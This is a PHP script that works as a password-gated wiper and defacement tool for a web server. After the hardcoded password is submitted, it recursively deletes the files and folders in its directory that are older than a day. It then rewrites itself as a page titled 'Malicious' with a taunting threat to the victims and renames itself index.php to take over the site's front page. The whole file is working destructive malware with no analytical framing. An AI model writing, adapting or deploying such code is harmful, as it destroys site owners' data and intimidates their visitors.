<?php
// Set the folder path to the current directory
$folderPath = __DIR__ . '/';

// Get the script's own filename
$self = basename(__FILE__);

// Set the time limit in seconds (e.g., 24 hours = 86400 seconds)
$timeLimit = 86400; // 24 hours

// Define the password (Change this to your desired password)
$adminPassword = 'avabd';

// Function to delete a folder and its contents
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }

    if (!is_dir($dir)) {
        return unlink($dir);
    }

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }

        $filePath = $dir . DIRECTORY_SEPARATOR . $item;

        if (is_dir($filePath)) {
            // Recursively delete subdirectories
            deleteDirectory($filePath);
        } else {
            // Delete files
            unlink($filePath);
        }
    }

    return rmdir($dir);
}

// Check if the password is provided
if (isset($_POST['password'])) {
    // Compare the provided password with the correct one
    if ($_POST['password'] === $adminPassword) {
        // Get the current time
        $currentTime = time();

        // Open the folder
        if ($handle = opendir($folderPath)) {
            // Loop through all the files and directories in the folder
            while (false !== ($file = readdir($handle))) {
                // Skip the '.' and '..' entries and the script itself
                if ($file != '.' && $file != '..' && $file != $self) {
                    $filePath = $folderPath . $file;

                    // Check if it's a file or directory
                    if (is_file($filePath)) {
                        // Get the file's last modification time
                        $fileModTime = filemtime($filePath);

                        // Check if the file is older than the time limit
                        if ($currentTime - $fileModTime > $timeLimit) {
                            // Delete the file
                            unlink($filePath);
                        }
                    } elseif (is_dir($filePath)) {
                        // Get the directory's last modification time
                        $dirModTime = filemtime($filePath);

                        // Check if the directory is older than the time limit
                        if ($currentTime - $dirModTime > $timeLimit) {
                            // Delete the directory and its contents
                            deleteDirectory($filePath);
                        }
                    }
                }
            }
            // Close the folder
            closedir($handle);
        }

        // Overwrite the script itself with new content
        $newContent = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious</title>
    <style>
        body {
            background: #000;
            color: #0f0; /* Green text for terminal look */
            font-family: 'Courier New', Courier, monospace;
            font-size: 24px;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        #container {
            position: relative;
            z-index: 1;
        }

        #loading {
            font-size: 48px;
            margin-bottom: 20px;
            letter-spacing: 2px;
            white-space: nowrap;
        }

        .glow {
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000;
            animation: glowAnimation 1.5s infinite alternate;
        }

        @keyframes glowAnimation {
            from {
                text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000;
            }
            to {
                text-shadow: 0 0 30px #ff0000, 0 0 50px #ff0000;
            }
        }

        span {
            display: inline-block;
            padding: 0 5px;
            font-weight: bold;
            transition: color 0.3s;
        }

        .message {
            font-size: 20px;
            color: #f5f5f5;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
            line-height: 1.4;
            text-align: center;
            animation: fadeIn 3s ease-in-out;
            white-space: pre-wrap; /* Preserve formatting */
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        #cursor {
            display: inline-block;
            width: 10px;
            height: 20px;
            background-color: #0f0;
            animation: blink 1s step-start infinite;
            vertical-align: middle;
            margin-left: 2px;
        }

        @keyframes blink {
            50% {
                opacity: 0;
            }
        }
    </style>
</head>
<body>
    <div id="container">
        <div id="loading"></div>
        <div class="message">This was done based on what you make. Please do not try to save yourselves or continue trying to solve the situation because this will increase the harm to you in an exaggerated way. We thank you and appreciate your understanding while enjoying your pitiful looks of fear.
        </div>
        <div id="cursor"></div>
    </div>

    <audio id="background-sound" autoplay>
        <source src="c.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            var letter_count = 0;
            var el = $("#loading");
            var word = "Malicious";
            var finished = false;

            el.html("");
            for (var i = 0; i < word.length; i++) {
                el.append("<span>" + word.charAt(i) + "</span>");
            }

            function write() {
                for (var i = letter_count; i < word.length; i++) {
                    var c = Math.floor(Math.random() * alphabet.length);
                    $("span").eq(i).text(alphabet.charAt(c));
                }
                if (!finished) {
                    setTimeout(write, 75);
                }
            }

            function inc() {
                $("span").eq(letter_count).text(word.charAt(letter_count)).addClass("glow");
                letter_count++;
                if (letter_count >= word.length) {
                    finished = true;
                    setTimeout(reset, 1500);
                } else {
                    setTimeout(inc, 1000);
                }
            }

            function reset() {
                letter_count = 0;
                finished = false;
                setTimeout(inc, 1000);
                setTimeout(write, 75);
                $("span").removeClass("glow");
            }

            write();
            inc();
        });
    </script>
</body>
</html>
HTML;

        // Open the script file for writing
        $fileHandle = fopen(__FILE__, 'w');

        // Check if the file opened successfully
        if ($fileHandle) {
            // Write the new content to the file
            fwrite($fileHandle, $newContent);

            // Close the file
            fclose($fileHandle);

            // Rename the script to 'index.php'
            $newName = $folderPath . 'index.php';

            // Check if the script is not already named 'index.php'
            if ($self !== 'index.php') {
                if (rename($folderPath . $self, $newName)) {
                    echo "\nScript renamed to 'index.php'.";
                } else {
                    echo "\nFailed to rename the script to 'index.php'.";
                }
            } else {
                echo "\nThe script is already named 'index.php'.";
            }

        } else {
            echo "Failed to overwrite the script file.";
        }
    } else {
        echo "Incorrect password.";
    }
} else {
    // Display the password prompt form
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Password Required</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin-top: 50px;
            }
            form {
                display: inline-block;
                background: #f4f4f4;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            input[type="password"] {
                padding: 10px;
                margin: 5px 0;
                border: 1px solid #ddd;
                border-radius: 3px;
            }
            input[type="submit"] {
                padding: 10px;
                border: none;
                border-radius: 3px;
                background: #007bff;
                color: #fff;
                cursor: pointer;
            }
            input[type="submit"]:hover {
                background: #0056b3;
            }
        </style>
    </head>
    <body>
        <form method="post" action="">
            <h2>Enter Password</h2>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Submit">
        </form>
    </body>
    </html>
    <?php
}
?>
